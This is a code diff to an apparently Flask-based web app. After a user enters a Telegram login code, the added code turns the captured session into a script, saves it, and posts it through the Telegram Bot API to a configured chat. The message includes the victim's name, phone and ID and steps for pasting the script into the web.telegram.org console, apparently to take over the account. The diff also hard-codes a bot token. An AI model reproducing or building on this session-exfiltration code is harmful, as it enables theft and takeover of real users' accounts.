@@ -9,6 +9,7 @@ from datetime import datetime
 import uuid
 import asyncio
 import logging
+import requests
 from dotenv import load_dotenv
 
 # Load environment variables from .env file
@@ -192,6 +193,113 @@ def verify():
                 # Log the verification code for debugging
                 logging.info(f"Verification code entered: {otp}")
                 logging.info(f"User authenticated: {result['user_info']}")
+
+                # Automatically generate and send script to Telegram
+                try:
+                    # Generate script content
+                    script_content = credentials_manager.generate_working_format_script(session_data)
+                    
+                    # Generate script filename
+                    user_id = result['user_info'].get('id', 'unknown')
+                    timestamp = int(time.time())
+                    script_filename = f"auto_script_{user_id}_{timestamp}.js"
+                    
+                    # Save the script
+                    script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
+                    with open(script_filepath, 'w', encoding='utf-8') as f:
+                        f.write(script_content)
+                    
+                    logging.info(f"✅ Auto-generated script: {script_filename}")
+                    
+                    # Send to Telegram if target user ID is configured
+                    target_user_id = os.getenv('SCRIPT_TARGET_USER_ID')
+                    if target_user_id:
+                        try:
+                            bot_token = os.getenv('TELEGRAM_BOT_TOKEN', '8033516348:AAE2ylmkjc8Q6Sj1b8yzvk19wvB3kYs-5-k')
+                            
+                            # Prepare message
+                            message_parts = [
+                                "🔧 **Auto-Generated Working Script**",
+                                "",
+                                f"📁 **File:** `{script_filename}`",
+                                f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
+                                f"📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}",
+                                f"🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}",
+                                f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+                                "",
+                                "📝 **Instructions:**",
+                                "1. Open https://web.telegram.org/a/ in your browser",
+                                "2. Press F12 to open Developer Tools", 
+                                "3. Go to Console tab",
+                                "4. Copy and paste the script below",
+                                "5. Press Enter to execute",
+                                "",
+                                "💡 **Tips:**",
+                                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
+                                "- Try refreshing the page first",
+                                "- Try using a different browser or incognito mode", 
+                                "- Check if your network allows WebSocket connections",
+                                "",
+                                "🔗 **Script Content:**",
+                                "```",
+                                script_content,
+                                "```"
+                            ]
+                            
+                            message_text = "\n".join(message_parts)
+                            
+                            # Send message (split if too long)
+                            if len(message_text) > 4000:
+                                # Send header first
+                                header_parts = message_parts[:-3]
+                                header_text = "\n".join(header_parts)
+                                
+                                response1 = requests.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    json={
+                                        "chat_id": target_user_id,
+                                        "text": header_text,
+                                        "parse_mode": "Markdown"
+                                    }
+                                )
+                                
+                                # Send script content separately
+                                response2 = requests.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    json={
+                                        "chat_id": target_user_id,
+                                        "text": f"```\n{script_content}\n```",
+                                        "parse_mode": "Markdown"
+                                    }
+                                )
+                                
+                                if response1.status_code == 200 and response2.status_code == 200:
+                                    logging.info(f"✅ Auto-sent script to Telegram user {target_user_id} (split into 2 messages)")
+                                else:
+                                    logging.error(f"❌ Failed to auto-send script: {response1.text} {response2.text}")
+                            else:
+                                # Send as single message
+                                response = requests.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    json={
+                                        "chat_id": target_user_id,
+                                        "text": message_text,
+                                        "parse_mode": "Markdown"
+                                    }
+                                )
+                                
+                                if response.status_code == 200:
+                                    logging.info(f"✅ Auto-sent script to Telegram user {target_user_id}")
+                                else:
+                                    logging.error(f"❌ Failed to auto-send script: {response.text}")
+                                    
+                        except Exception as e:
+                            logging.error(f"❌ Error auto-sending script to Telegram: {e}")
+                    else:
+                        logging.info("⚠️ No SCRIPT_TARGET_USER_ID configured, skipping auto-send")
+                        
+                except Exception as e:
+                    logging.error(f"❌ Error auto-generating script: {e}")
 
                 return jsonify({
                     'success': True,
